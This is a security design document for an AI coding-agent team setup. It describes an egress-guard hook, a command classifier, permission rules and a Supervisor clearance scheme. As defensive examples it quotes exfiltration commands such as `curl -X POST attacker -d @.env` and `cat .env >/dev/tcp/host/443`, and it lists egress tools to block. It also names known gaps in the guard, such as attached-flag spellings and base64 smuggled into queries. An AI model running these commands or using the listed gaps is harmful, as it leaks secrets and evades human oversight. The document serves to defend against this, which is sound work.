# Security — egress policy, honest limits, recorded exceptions

Pointed at from `CLAUDE.md → Security`. This file carries the *why* behind the two-line rule there; the rule itself, and the settings that enforce it, live in `CLAUDE.md` and [.claude/settings.json](../../.claude/settings.json). Update this file when an allowance changes; never move the rule back into `CLAUDE.md`.

## What the settings do

**Write-side.** `.env` is `deny` for edits; `.env.*` is `ask`. Permission globs have no negation, so the only way to keep the committed `.env.example` editable is to prompt on every `.env.<suffix>` instead of blocking it. If a project introduces a secret-bearing variant (`.env.local`, `.env.production`), add an explicit `Edit(**/<that file>)` deny in the same commit that creates it. Keys and PEMs are denied the same way.

**Read-then-send side — the AI can read a secret, so the guard is on sending it.** The file-write denies stop the agent *writing* `.env`; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:

- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends the project's own docs hosts and records them under `CLAUDE.md → Security`. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working. Add hosts you can name a reason for; let the rest prompt.
- **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`, `--body*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.

**Auto mode (team roles).** In auto permission mode the classifier would approve an unlisted `WebFetch` host and read-only HTTP without a prompt, so "anything else prompts" above would no longer hold. The checkpoint is kept by the PreToolUse hook `guard-team-egress` ([.claude/hooks/guard-team-egress.sh](../../.claude/hooks/guard-team-egress.sh)): it returns `ask` (never `allow`, so `deny` still wins), is registered with `"onFailure": "block"` by `/setup:teams` (`team-setup.sh`, under the exact matchers `Bash` and `WebFetch`) in the project's `settings.json` — the template's shared settings do not carry it, the team layer opts in — runs in team mode only, and the runner gives a role auto only when its clone has the hook. `WebFetch` is checked by parsed hostname against the `WebFetch(domain:…)` allow rules of `settings.json` + `settings.local.json` (bare wildcards ignored). It is a **best-effort guard over `Bash` and `WebFetch`, not an allowlist**; `WebSearch` and MCP tools (browser, cloud, connectors) are out of its scope and are not hooked. The Bash part asks on an egress-capable verb in command position (also in `bash -c`, `tmux`, `eval`, `$(…)`, here-doc lines, the string of `flock -c` and `env -S`, and behind wrappers such as `env`, `timeout`, `stdbuf`, `flock`, `watch`, `find -exec`; a redirection before the verb is read through — `</dev/null curl …`, `2>&1 curl …` — and a brace-expanded verb such as `{curl,} …` asks): `curl wget ssh scp rsync nc ftp sftp gh npm pip pip3 osascript`, plus `python`/`python3` with `-c` and `node` with `-e`/`-p`/`--eval`. The sanctioned local syntax checks are `bash -n`, `node --check`, `jq empty` and `d="$(mktemp -d)" && python3 -I -X pycache_prefix="$d" -m py_compile <file>` (`py_compile` is one of the guard's local modules; `-B` does not stop it writing a `__pycache__` beside the file, the prefix does); the role prompts and the review finders name these, never `python3 -c`. Target-specific permission rules still apply to them. The read-only `gh pr view` and `gh issue view` that `/setup:teams` allows the roles pass only as a plain command: `gh` as the command's own first word (behind `timeout`, `env`, `xargs`, `find -exec` or a `VAR=…` prefix it is asked — a wrapper can rewrite or append the checked arguments), a `-R`/`--repo` value of plain `OWNER/REPO` (a host part — `host/o/r`, `git@host:o/r`, a URL — is asked), no `://` argument (a PR or issue URL picks its host), no `--hostname`, no brace expansion (`--re{p..p}o=…` becomes `--repo=…`) and no option-shaped glob (`--rep[o]` matches a file named `--repo`), and no `$`, backtick, `#`, backslash, `GH_HOST` or `GH_REPO` anywhere in the command text or its tokens (an expansion or substitution can rebuild any of these at run time; `#` and a backslash confuse the guard's comment stripper; the two variables select gh's host). The check reads the whole command string, so a quoted `';'` cannot cut an argument off. One exception: a `--jq`/`-q`/`--template`/`-t` value that gh's option layout binds (`gh pr|issue view`) and that is one single-quoted word is data — it is excluded from the taint and host-selector checks (`gh issue view 1 --jq '"\(.title)"'` passes, also piped into an allowlisted companion such as `head`, never into a shell or interpreter); a double-quoted or unquoted value is checked as before, and an unknown option or `--` before it ends the binding. A `/dev/tcp/…` or `/dev/udp/…` path (bash's socket redirection, e.g. `cat .env >/dev/tcp/host/443`) asks whatever the verb — also quote-split and inside `bash -c`, `eval`, `$(…)`, `flock -c` or `env -S`; a path assembled through an expansion (`d=/dev/t; … >${d}cp/…`) is not caught. Shell-specific glob syntax beyond `*`, `?`, `[`, braces and a glued `(` (e.g. zsh `^` under `extendedglob`) is not seen by the gh read check. `nc -z` with only `-v/-w/-G` flags to `localhost`/`127.0.0.1`/`::1` (local docker SQL probe) is not treated as egress. A network `git` command (`push`, `fetch`, `pull`, `clone`, `ls-remote`, `submodule add`, `remote add|set-url`) whose repository argument is a URL or `host:path` asks unless that host is in the same `WebFetch(domain:…)` allowlist; a bare remote name or a local path passes (the settings keep `git push/pull/fetch` on allow for that case). A script file with its own HTTP client (`python3 x.py`, `node x.js`), a compiled binary, a verb built by `$` expansion (`$c x`), the string other wrappers hand to a shell (`watch 'a; b'`, `su -c`, `script -c`), and every tool outside `Bash`/`WebFetch` are not caught. Auto mode is **not** claimed equivalent to manual mode for egress.

**Local `gh` rules for the Supervisor.** The Supervisor in the main checkout — `TEAM_SESSION_ROLE=Supervisor`, no `TEAM_RUN_TEAM`, neither `.agents/team/session.json` nor `.agents/team/team.json` — gets no guard prompt for a `gh` command that matches a `Bash(gh …)` allow rule of that checkout's `.claude/settings.local.json`. The rule is the switch: per clone, never committed, never shipped. Forms honoured: `Bash(gh <words>)` (exact), `Bash(gh <words> *)` and `Bash(gh <words>:*)` (word prefix), at least one word after `gh`, words split on spaces; a rule with another `*`, a `:`, a quote or a backslash in its words (`Bash(gh *)`, `Bash(gh:*)`, `Bash(*)`, `Bash(gh * create)`, `Bash(gh api https://…)`, `Bash(gh issue create --title "a b" *)`) is ignored, so its commands are still asked. Limits: never a team role, the per-run TeamLead or an Advisor; a rule in `settings.json` has no effect; a malformed `settings.local.json` keeps the prompt.

**Commands the Operator invoked.** While the running turn's prompt — the newest message a human typed into the Supervisor's window, read from the session's own transcript (`transcript_path` of the hook payload) — names `/pr-create` or `/pr-merge` as a whole word (typed in a sentence, or the slash command itself), the Supervisor's `gh` calls of that command are covered like a local rule: `gh pr create …` for `/pr-create`; `gh pr merge …` and `gh pr ready …` for `/pr-merge` (`.claude/hooks/lib/guard_team_egress_operator.py`). The invocation is the Operator's decision, so the guard does not ask again; a `gh` write the Supervisor starts on its own keeps the prompt. The cover ends with the turn (a later prompt without the name grants nothing; a message sent mid-turn is no prompt) and is judged like a local rule — a host selector, unquoted shell syntax or an uncovered segment beside it still asks. Not a prompt: a skill body or tool result, a machine line (`TEAM_EVIDENCE_MACHINE_RE`: a doorbell, `[peer] `, `<hc from=…>`), a record without a human origin; a transcript that does not parse back to that prompt grants nothing. Never a team role, the per-run TeamLead or an Advisor. It raises the bar, it is not proof (the same-account limit of `team-lead.md` §7). Claude Code's own permission rules still decide after the guard steps aside.

*Host selectors.* gh's own host selectors keep the prompt too: `--hostname` (and `-h` in any short-flag cluster under `gh auth`), a `-R`/`--repo` value that is not plain `OWNER/REPO`, any `://` (except, for the Supervisor, a word starting `https://github.com/` — the default host; `https://github.com.evil/…`, `https://github.com@evil/…`, `https://github.com:443/…`, `http://…` and a glued `--url=https://…` still ask — #287), and any brace expansion (`{a,b}`, `{a..b}`) or option-shaped glob (`--rep[o]`, `[-]-repo`) that could rebuild one. On the Supervisor's path a repo value is judged whole, a quoted `<` or `>` included (`'--repo=evil.example/o</r'` asks); a team role's read path keeps asking on any `://`. Not checked: a positional `HOST/OWNER/REPO` of `gh repo view|clone|fork|…` under a matching rule, and the host gh picks from the current directory's git remotes (remote URLs pass the git host check above). The guard only steps aside — Claude Code's own rules still decide. A `gh` write rule is a standing channel to every repository the token can reach (`-R other/repo` included): allow the narrowest subcommands (`Bash(gh issue create *)`, not `Bash(gh issue *)`).

*Compounds.* Segments joined by `;`, `&&`, `||`, `|` or a newline, with `>`/`>>`/`N>`/`&>` to a literal file and `N>&M` (one-digit fd), pass when each segment is a covered `gh` command or an allowlisted companion — `cd` (one literal path), `jq`, `head`, `tail`, `sort` (no long option: an abbreviation of `--compress-program` runs a program), `uniq`, `wc`, `grep`, `cut`, `tr`, `cat`, `column`, `tee`, `echo`, `printf` (format with only `%s`/`%%`, no `-v`), `true` — and each companion also passes the egress check (`.claude/hooks/lib/guard_team_egress_supervisor.py`). The reader refuses anything else outside single quotes: `$`, backtick, `\`, `#`, `<` (heredocs, input redirection), `(`/`)`, `{`/`}`, `!`, a background `&`, `|&`, an unquoted glob or `~`, a word starting with `=`; double quotes may not hold `$` or a backtick, escaped or not (a `\` there is data: `\"` and `\\` are one character, a `\` before any other is literal). A plain `git [-C <dir>] ls-remote|fetch` the git host check passes may stand beside a `gh` read. So a `$(…)` body, `bash -c`, `eval`, `xargs`, `| bash` and zsh `noglob` keep the prompt. A compound where `gh` output is piped into a stdin executor — a shell or interpreter with no script operand (or `-`, `/dev/stdin`, a shell's `-s`), `xargs`, `source`/`.`, `eval`, or a wrapper such as `timeout`, `env`, `noglob` — asks explicitly, even when the `gh` part is a read; any other segment outside the list keeps the verdict it had before (`gh issue view 5 | sed -n 1,20p` stays silent, `ls && gh issue create x` still asks). A covered `gh` command, alone or as a segment, is judged by the plain-command test above with these differences. Since #287 only its unquoted text is checked for `$`, a backtick, `<`, `>`, `#` or `\` — what the reader accepted inside quotes reaches gh as an argument and never runs in the shell (a rule such as `Bash(gh alias *)` still lets gh itself run one, so keep the rules narrow), so `--body "Split out to #286."` and `--subject 'fix(x): y (#6)'` pass; a quoted word made only of separator characters (`'()'`, `';'`) still keeps the prompt; the read path's taint scan (a glued `(`, `GH_HOST`, `GH_REPO`) is not applied, so `--title 'feat(x): y'` and `--body 'call foo() first'` pass.

*Built-in reads (#268).* The guard judges `gh` by effect: the read-only forms — `pr view|list|status|diff|checks`, `issue view|list|status`, `repo view`, `run list|view`, `release view|list`, `label list`, `project view|list|item-list|field-list`, `search issues|prs|repos|code|commits` — only read from GitHub under the user's own login, so they are not egress for any role (a role's own read path) and need no `Bash(gh …)` rule for the Supervisor's compounds; a `gh api` call with no method, field or body option (`-X`/`--method`, `-f`/`-F`/`--field`/`--raw-field`, `--input`), counts as a read for the Supervisor only — so does `gh api graphql` (#272) when no word holds `mutation`, no field reads a file (`=@`) and there is no `--input`/`-X`; its `name='<query>'` field values are data. Everything that can point a read at another host still asks: `GH_HOST`/`GH_REPO`, `--hostname`, a repository value (`-R`/`--repo`, the positional one of `repo view`) that is not plain `OWNER/REPO`, a URL (for the Supervisor: any but one starting `https://github.com/` — #287), any `$(…)` or unresolved `$`. A single-quoted value right after `--jq`/`-q`/`--template`/`-t` (before `--`, not itself an option's value) is data. The starter's `settings.json` allows the same read forms, so a fresh project does not prompt for them either. *Literal assignments:* `NAME=<literal>` segments at the head of a command (`;`, `&&` or a newline after each; the literal only letters, digits and `_./:,=+@%-`, a leading `~/`, or a double-quoted value that may also hold spaces — #272) are written into `$NAME` / `${NAME}` outside single quotes before any check, unless the name is rebound later (assigned, `read`, a loop variable, `export`, `unset` …) or the command holds a here-document. The corpus `.claude/lib/tests/fixtures/guard-corpus.txt` pins real session commands and their verdicts.

*Loops (#272).* A literal `for NAME in <values>; do <body>; done` (`;` or a newline before `do` and `done`) anywhere in a compound — after `cd X &&`, followed by `2>&1`, `; <more>` or a pipe — is judged once per value: the whole command with the loop replaced by its body and the value written in for `$NAME` / `${NAME}` outside single quotes (also inside `$(…)`). Silent only when every unrolled command passes the compound test; an explicit ask in one asks (`done | bash` keeps the gh-into-a-shell ask); otherwise today's verdict. Values are 1–64 plain words (none starting with `-` or `=`, no glob); at most 64 unrolled commands in all (a second loop multiplies); a `\` outside single quotes, a backquote, `$((` or an unclosed quote keeps the prompt.

*Every role (#322).* The compound reader, the loops, the literal heads and the `$(…)` of reads below run for every role (the session gate is gone); only the local `Bash(gh …)` rules and the inline-Python opt-ins are the Supervisor's.

*`$(…)` of reads (#272).* For every role (#322; the Supervisor only before it), a `$(…)` whose inside the compound test exempts (gh reads and companions) is data in an `echo`'s arguments (`echo "#$p $(gh pr view $p -q .x)"`); standing anywhere else — a gh, python or filter argument — it keeps today's verdict.

*Companions (#268, #272).* `cd` (one argument), `jq`, `head`, `tail`, `sort` (no long option), `uniq`, `wc`, `grep`, `cut`, `tr`, `cat`, `column`, `tee`, `echo`, `printf` (only `%s`/`%%`), `true`, `ls`, `sleep`, `rg` (no `--pre`, `--hostname-bin`), `git` read subcommands (`log show diff status ls-files rev-parse blame grep shortlog describe ls-tree cat-file merge-base rev-list`; global options only `-C`, `--no-pager`; no `--output`, `-O`, `--ext-diff`) and `sed -n '<range>p'`. A leading `~/` is a plain path; a `*`/`?` glob only after a literal prefix that is no option (`.claude/lib/*.sh`, never `*.md`), never in a gh command or a redirection target.

*Inline Python (#272).* Inline Python is judged by its code, for every role and without a local rule: `python3 [-I…] -c '<code>'` (also inside a compound or a pipe from gh) and a quoted-delimiter here-doc `python3 [-I…] - [args] <<'D'` (after any prefix, `cd "<dir>"; …`, with commands after the closing line) are not egress when the code parses, imports only local-only standard modules (`json`, `sys`, `re`, `os`, `pathlib`, `collections`, `shutil`, `csv`, `textwrap`, `difflib` … — never `subprocess`, `socket`, `urllib`, `http`, `logging`, `platform`, `pickle` …), every import at the top, and names no `exec`/`eval`/`compile`/`getattr`/`globals`/`vars`, no dunder or `_`-attribute, no `os.system`/`popen`/`exec*`/`spawn*`/`fork*`, and uses `sys` only for `argv`, `stdin`, `stdout`, `stderr`, `exit`, `version`, `platform`. A `$` or backquote in `-c` code (a shell expansion) keeps the prompt. File writes are not egress (Operator 2026-11-23: the guard asks for the network or a process, not for local edits). Python output piped into a shell or interpreter (`| bash`, `| xargs`) asks for every role. Known limit: without `-I` the code could write `<module>.py` into the cwd that a later stdlib call imports lazily — use `python3 -I`. A `cat [> f] <<'D'` with a quoted delimiter (not read by `<(…)`/`$(…)`) is data: its body is not scanned. So is the body of a leading `git [-C <dir>] [-c user.name|email=…] commit [-q] -F - <<'D'` — the commit message; what follows the closing line is read as before. The local rules `Bash(python3 -)` (any heredoc: a quoted delimiter, or an unquoted one with no `$`, backtick or `\` in the body; the first delimiter line must end the command; no `<<-`) and `Bash(python3 -c *)` / `Bash(python3 -c:*)` (any one-quoted-word code) stay the Supervisor's consent to code the check above refuses; `Bash(python3 *)` counts for nothing. The same entry is also a native Claude Code allow rule, so it lifts Claude Code's own prompt for every plain (non-role) session in that checkout too — add it knowingly.

*Effect classes (#322).* One classifier (`.claude/hooks/lib/guard_team_egress_classify.py`, with `guard_team_egress_words.py` and `guard_team_egress_hard.py`) decides the guard's verdict for **every role** — the Supervisor, a TeamLead, an Advisor and a team stage get the same kind for the same text — and the stage tier (`team_prompt_authority.tier_full`, `team_prompt_check.unwaivable`) uses the same module. Its four kinds, in this order: **deny** (the hook prints `permissionDecision: "deny"`; never cleared by anyone, no batch, no local rule) — a request body or upload from a file or stdin (`curl -d|--data*|--json @…`, `--data-urlencode name@file`, `-F x=@…`/`<…`, `-T`/`--upload-file`, `wget --post-file|--body-file`, `gh api --input`, `gh api -F x=@file`), a `/dev/tcp|udp` path a shell opens (a redirection target, or the operand of `exec`/`source`/`.`/a shell, at any nesting level a shell executes), a token in a URL the egress command contacts (the `leak-patterns.sh` high-confidence formats, or a `token`/`access_token`/`api_key`/`apikey`/`key`/`sig`/`password`/`secret` key with a value in a path or query; curl's URL operands, every other egress verb's positional words), downloaded content a shell or interpreter executes (curl/wget output piped, through any data filter, into `sh`/`bash`/`zsh`/`dash`/`ksh`/`eval`/`source`/`.`/`xargs` or an interpreter reading its program from stdin — `python3 -`, `node -`, a bare `perl` — also behind `command`/`env`/`timeout`/`sudo`… on either side of the pipe; a `<(curl …)` such a command reads; `-c`/`-e`/`eval` code built by `$(curl …)`), a Bash write (redirection, `tee`, `cp`/`mv`/`install`/`ln`, `sed -i`, `perl|ruby -i`, `dd of=`, `curl -o`, a literal inline-Python write target, a write through a link an earlier `ln` of the same command made; a `cp`/`mv`/`install`/`ln` destination is also read as a directory receiving each source under its own name) into the `.claude/settings*.json` or `.claude/team/sessions/*.settings.json` of a live guard layer (the session project's `.claude/`, a checkout root's — its parent holds `.git`: the clone, the main checkout, the starter and its worktrees —, the user's Claude config dir, or any `.claude/` outside every repository, one that does not exist yet included; only a fixture project's `.claude/` inside a repository tree, an ancestor holding `.git`, is not one), resolved against the call's cwd and every literal `cd`, a literal `for` loop unrolled. Each deny detector judges the executed effect, never a mention of its shape (#322 round 2): a socket path, a token URL, a `| sh` or a `>`/`<` inside a quoted argument (`grep 'a>.claude/settings.json'`), a grep pattern, a commit message or a data here-doc body, a download read as data (`jq`, `grep`, `command grep`, `sed`, `tar`, `python3 -c '<own code>'`), a literal backquote (escaped, or in single quotes), and a fixture project's `.claude/` inside a repository are no deny — such a command keeps the class the other rules give; **operator** (the hook asks; only the Operator clears it) — a method other than GET/HEAD or a literal body (`--data-raw` / `--form-string` values are always literal), explicit credentials (`curl -u|-n|--netrc*|-K|-E|--key|--oauth2-bearer|-b`, an `Authorization`/`Cookie`/token header, URL userinfo, a `*TOKEN`/`*SECRET`/`*PASSWORD` assignment before an egress verb), `GH_HOST`/`GH_REPO`/`--hostname`, a gh write naming another repo than the project's (`github.repo`, else origin's `OWNER/REPO`; no known own repo, no class) or a host-qualified `HOST/OWNER/REPO` on another host than github.com (whatever owner and repo follow), a `git push` whose effective destination is not the verified origin (the named remote, or for an implicit push `branch.<b>.pushRemote` → `remote.pushDefault` → `branch.<b>.remote` → `origin`; every `pushurl` and `pushInsteadOf` rewrite must equal origin's URL; any command-local `-c`, `--repo`, a `GIT_*=` assignment before the push or exported in the same command, or an unresolvable destination is operator), a private host (a private, loopback, link-local, CGNAT, ULA IP literal, a reserved TLD — `localhost local localdomain internal intranet lan home corp private test example invalid onion arpa` — or a single label; checked before the allowlist), an unpinned install (`npm i|install|add` without `@<exact version>` or from a URL/git spec, `pip install` without `==` or from a URL, `npx`, `uvx`, `pipx run|install` unpinned), a Bash write into a guard's `.claude/hooks/**` (below), an unparsable command naming an egress tool; **pass** (no output) — today's reading with the compound reader for every role, plus `npm view|ls`, `pip|pip3 list|show` with no registry/index/proxy option, `git fetch|pull|clone|ls-remote` toward a public host (every URL word of the command is checked, so a value option such as `clone --branch main` before the repository changes nothing; not when the command line makes git run a local command — a command-running `-c`/`--config` key such as `core.sshCommand`, `--config-env`, `--upload-pack`, `--exec`, `--template`, clone's `-u`, a `GIT_SSH_COMMAND=`-style or `GIT_CONFIG_KEY_<n>=` assignment: ask), and the **public GET**: WebFetch to an allowlisted host (any URL, as before) or a short public GET, and `curl` with only `-s`/`-S`/`-f` clusters, at most one `-o <plain relative path>` (literal, no `..`, no dot-named part such as `.git/config` or a shell rc file, not starting with `~` or `/` — any other target keeps the ask) and exactly one URL that is a public GET — no curl URL glob (`{a,b}`, `[1-9]`: one word, many requests), `https`, no userinfo, no backslash, no `?`, at most 160 characters, no token, a **public host**: lexically a DNS name of ≥ 2 `[a-z0-9-]` labels with an alphabetic, non-reserved TLD and no IP literal in any spelling, **and** every address `getaddrinfo` returns for it at classification time public (2 s bound in a daemon thread; a failed, stalled or mixed answer is no pass). The resolver is the module attribute `RESOLVER`: the tests and the replay harness swap in an offline stub (the replay assumes every lexically public name resolves publicly). A curl config file read implicitly (`$CURL_HOME/.curlrc`, `$XDG_CONFIG_HOME/curlrc`, `~/.curlrc`, `~/.config/curlrc`) blocks the curl pass. **ask** — egress-capable and in neither list (#323's clearable middle). A deny is a mechanical block: the Supervisor's touch log records it as `kind: block`, `reason: hook`. The guard's reason text stays today's wherever the verdict (ask) did not change. *Hooks and the guard's own files* (Operator decision d-2): a team stage's Bash write into the run's starter worktree (`<teams.starter_root>-<team>-<ticket>`) is ordinary, into its own clone's `.claude/hooks/**` (the guard armed for this session) is operator, anywhere else is deny; a TeamLead, Advisor or Supervisor Bash write into `.claude/hooks/**` gets no class in this phase (Operator decision d-4 — #323's role-profile hook covers these sessions). A relative write target after a `cd` the classifier cannot resolve is classed only by its name (a protected basename → deny; for a team stage also a path under a `.claude/hooks/` part or starting `hooks/` — never an app's `src/hooks/x`); `NAME=literal` heads are written in first. A stage's Edit/Write is guarded by its ask hook (`team-ask-hook.sh`, registered by the runner from the main checkout): settings and role profiles of a live guard layer (as above; a fixture project's inside the clone is an ordinary file) are denied, `.claude/hooks/**` only in its clone and the run's starter worktree. The Supervisor's local `Bash(gh …)` rules and `Bash(python3 …)` opt-ins stay its own grant (above), never a rule of the classifier.

*Touch log.* Every Supervisor `ask` (the fail-closed one too) appends one line in the Operator touch-log format to `.agents/touches/<yyyy-mm>.jsonl` (`kind: permission`, `reason: guard`, the reason as `what`, `where: solo <dir>`); from a valid hook payload the line also carries the masked `input` of the call (operator-touches.md → Entry), written after the verdict and never able to change it — a missing `touches.py` drops only that field. A symlinked directory, a FIFO or a hard-linked month file skips the line; the shell fallback for a classifier that failed to run checks, then appends — not race-free, unlike the Python writer. `.agents/touches/` is gitignored.

## Supervisor clearance (#323)

*One checker.* `.claude/hooks/lib/guard_team_egress_clear.py` (`clear_class`) sorts every permission request of a role session and every operator-tier stage permission into four results, in this order: **hard** — a classifier `deny`/`operator` kind, a human-only or never-waived tier cause (`tier_full`), a write by any tool or any Bash form the classifier reads (redirections, `tee`/`cp`/`mv`, `curl -o`, inline-Python targets) into settings, role profiles, `.claude/hooks/**`, `.codex/hooks.json`, a team ledger (`.agents/team/clearance*`, `relays`, `delegated`, `mandate.json`, `asks`, `decisions`) or the main checkout's trusted clearance code, a reserved gh operation (`pr merge`, `release`, `repo`, `secret`, `variable`, `workflow`), any deny or ask rule of the session's effective rules (the launch profile, the project and local settings, the user's settings in the declared Claude profile and the managed settings; Bash through the tier's canonical matcher, file rules against the resolved target, WebFetch by `domain:`; a rule that cannot be evaluated is hard), or any error; **pass** — a mechanical allow: Bash whose classifier kind is `pass` and whose every simple command (literal loops unrolled) is an egress read (gh read forms and GET `gh api`, `npm view|ls`, `pip list|show`, `git fetch|ls-remote` into remote-tracking refs only, the curl public GET without `-o`) or a companion that writes nothing (no `tee`, no `sort -o`, no `uniq in out`), with no redirection but `/dev/null` and fd duplication, or a WebFetch the classifier passes — a classifier pass that is only "no egress at all" (`rm x`, a local script) is **none**; **clearable** — the classifier kind is `ask` (a stage's edit for the worktree class) and exactly one of the five classes matches; **none** — everything else, also *no decision*: a launch rules digest that differs (`TEAM_CLEARANCE_RULES`), a missing launch profile, a PreToolUse hook matching the tool whose ask the checker does not reproduce (`reproduced_hooks`), a plugin the session enables (or a `CLAUDE_CODE_PLUGIN_DIRS` directory) whose hooks `team-evidence.sh`'s inventory (`team_evidence_plugins`, `team_evidence_tree`) shows for a guarded event or cannot resolve. It fails closed (an exception → hard) and reads no resolver setting (tests swap the classifier's `RESOLVER` through `fixtures/clearance/drive.py`).

*The five classes* (`clearance-classes.json`): **public-get-long** — a WebFetch, or `curl [-sSf] [-o <plain path>] <one URL>` piped only into `grep head tail wc jq sed -n cut sort` (no `-L`, no loop, `;` or `&&`), whose URL meets every #322 public-GET condition but the query ban and the 160-character cap (https, no userinfo, backslash or token, at most 2048 characters, a lexically public host whose addresses resolve public at check time — the address check runs for an allowlisted host too); **lockfile-install** — `npm ci --ignore-scripts [--prefix <dir>]` (no `.npmrc` there) or `pip install --require-hashes --only-binary=:all: --no-deps -r <file>`, the lockfile or requirements file tracked and byte-equal to `HEAD`'s blob (read with `git cat-file` through the hardened reader: no filter or hook runs), the requirements free of `-r`/`-c`/`-e`/index/find-links options, URLs and path requirements; a registry, index, proxy or config option is hard; **gh-own-repo-write** — `issue comment|create|edit|close|reopen`, `pr comment|create`, `project item-add`, `label create`, parsed by a positive grammar per kind (`--attach`, `--input` or any unmodelled option → none), every repository it names — `-R`, a positional issue/PR URL, else every remote of the cwd's repository — the own repo of the **main checkout's** profile (`github.repo`, else origin), `project item-add` only to the configured project owner and number with an own-repo URL, a `--body-file` pinned and its first 2000 bytes shown to the Supervisor; **starter-worktree-edit** — a team stage's Edit/Write/MultiEdit/NotebookEdit inside its run's own starter worktree (`<teams.starter_root>-<team>-<ticket>` of the main checkout's profile, registered in the starter's `git worktree list --porcelain`, the stage the anchored team's active run, session and attempt); a directory merely named like one is none, settings, hooks and asked files there stay hard; **inline-code-no-io** — `python3 -I -c '<literal>'` or a quoted-delimiter `python3 -I -` here-doc that `py_code_safe` refuses **only** for an import of `ast tokenize configparser plistlib sqlite3 xml.etree.ElementTree` or an allowed import that is not leading, every other restriction kept (plus `enable_load_extension`/`load_extension`); a network or process module, `__import__`/`exec`/`eval`/`compile`, a process-running `os`/`posix` attribute or a string literal naming `.claude/`, `.codex/` or `.agents/team` is hard; nothing new for `node -e`.

*List version.* `clearance-classes.json`'s `version` plus the **policy digest**: sha256 over the bytes of every `trusted_code` file of the main checkout in list order (the class file, the guard and checker libraries, both hooks, `team-clearance.sh`, the tier, the ask channel, the evidence, mandate and team libraries, `touches.py`, `baseline-ask.json` and the load closure of their imports and sourced shell libraries, the session host's included; an imported or sourced module the list misses fails closed). A change of any byte sends every session to shadow and needs a fresh typed grant newer than the new version's first shadow line.

*Carriers.* **A** — `team-clearance-hook.sh`, the `PermissionRequest` hook of the Advisor, Supervisor and TeamLead profiles (matcher `Bash|WebFetch|Edit|Write|MultiEdit|NotebookEdit`, never `AskUserQuestion`; 300 s; invoked by the main checkout's absolute path with `TEAM_CLEARANCE_SEAL` and `TEAM_CLEARANCE_RULES` filled at launch), plus its PreToolUse write guard in the Advisor and Supervisor profiles (the clearance ledger → deny; settings, role profiles, `.claude/hooks/**`, `.codex/hooks.json`, a team ledger, the main checkout's trusted clearance code → ask). **B** — `team-ask-hook.sh` for a team stage: an operator-tier permission whose fourth checker line `clearance:` names a class, with no batch match and no earlier answer waiting for the same request (that answer wins, an Operator deny included). **Shadow** (the default; Codex always): one `shadow` touch line per request (`would-pass`, `would-clear`, `own`, `hard`, `none`), no output — carrier B then goes on to its ask path. **Enforce** — only when the switch verifies now, names host `claude` and its record's sha256 is the launch's seal: pass → allow; hard or none → no output (the human dialog); clearable in the Supervisor's own session, sub-agents included → no output, logged `own`; no registered, live Supervisor → no output; otherwise a request under `<main>/.agents/team/clearance/requests/c-<n>-<16 hex of the request hash>.json`, a `clearance` doorbell in the Supervisor's inbox, a wait (A: until 15 s before its timeout; B: at most min(240 s, half the ask deadline)); a claimed Supervisor allow → allow (B: authority `supervisor (cleared)` in `answers.md`, no Operator decision), a claimed deny → deny, `unsure`, a timeout or any failure → no output (B: the existing ask path). Never a rewritten input, never a permission update, never an allow on a timeout.

*The ledger.* The request hash covers the payload, every pin's digest (a body file, a lockfile and `package.json`, an edit target, a `curl -o` target), the resolved destination and the binding (session, role, team, run, attempt, switch id, list version). `team-clearance.sh pending` renders open requests from the script's fields, masked; `answer <id> allow|deny|unsure` (the Supervisor only, from the main checkout) re-derives class and hash from the stored payload on the current tree and refuses a hard, none or changed class, a changed pin, an expired, answered or used request, a switch that does not verify or a changed list. The carrier claims an answer once (`used/<id>.json` by a link that never overwrites), after reclassifying its live payload and recomputing every pin, and only with the registered Supervisor transcript's own `bash .claude/lib/team-clearance.sh answer <id> <verdict>` call and its non-error result after the request was filed; a hand-written answer is forged.

*The switch.* The Operator types, as a whole message in the registered Supervisor window, `clearance enforce claude for <N>h|<N>d` (at most 7 days), then runs `bash .claude/lib/team-clearance.sh grant`, which refuses a host with no shadow line under the current list version and a message older than that version's first shadow line. `revoke clearance` cancels for good, `pause` removes the record; both, an expiry and a list change take effect at once (shadow); a switch typed after a launch enforces from the next launch (the seal). **Codex stays shadow** — no hook decision there reaches `approvals_reviewer`, not a human (the probe saw `auto_review` approve a write), so "no output" cannot carry the human dialog; `grant` refuses host `codex`. The enforcement handed to the Operator's later decision: on Codex a hard result and an unanswered request would return an explicit `deny`, only a pass or a Supervisor allow `allow` — which changes what `auto_review` decides today. `.codex/hooks.json` loads only in a trusted project after the Operator's own acceptance of the new hook. T3 narrows with it: an operator-tier permission whose only cause is an `ask`-kind egress is delegable under the mandate's classes when the stage checker's `clearance:` line is `pass`, `none` or `clearable <class>` — never `hard`, never `undecided` (the checker may not decide: a guard or plugin hook it does not reproduce, changed launch rules) (team-lead.md §7).

*Log.* `cleared` (reason `supervisor`, the answer, `{id, class, request_hash, list_version, authority: "supervisor (cleared)"}`) and `shadow` (reason `hook`, `{result, class, list_version, host}`) touch-log lines — never an Operator touch, reported apart (`touches.sh report`, `/tasks-status` → `Clearance:`).

## Honest limit

These are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.

